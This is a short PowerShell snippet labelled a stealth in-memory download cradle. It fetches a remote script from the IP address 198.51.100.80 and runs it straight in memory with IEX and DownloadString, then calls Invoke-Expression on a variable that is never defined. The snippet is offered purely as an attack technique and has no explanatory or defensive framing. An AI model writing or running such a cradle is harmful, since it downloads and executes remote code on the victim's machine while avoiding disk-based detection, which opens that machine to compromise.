# Stealth in-memory download cradle
$url = "http://198.51.100.80/stage.ps1"
IEX(New-Object Net.WebClient).DownloadString("http://198.51.100.80/stage.ps1")
Invoke-Expression -Command $buffer
